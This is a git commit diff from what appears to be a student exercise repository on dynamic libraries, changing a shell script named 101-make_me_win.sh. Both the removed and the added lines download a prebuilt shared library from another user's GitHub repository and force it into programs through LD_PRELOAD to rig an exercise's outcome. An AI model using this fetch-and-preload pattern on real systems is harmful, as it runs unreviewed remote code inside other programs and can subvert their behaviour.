d026b3b062c2e4f02d14dbc69118f5107430662e
asmeyb <asmeb@gmail.com>
2021-09-20 08:22:29 -0700

    All in One

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -q --output-document=$HOME/lib_inject.so https://github.com/Elmahdi1962/alx-low_level_programming/blob/master/0x18-dynamic_libraries/lib_inject.so?raw=true
-export LD_PRELOAD=$HOME/lib_inject.so
+wget -O /tmp/win.so https://github.com/Henok100/alx-low_level_programming/blob/master/0x18-dynamic_libraries/win.so
+export LD_PRELOAD=/tmp/win.so
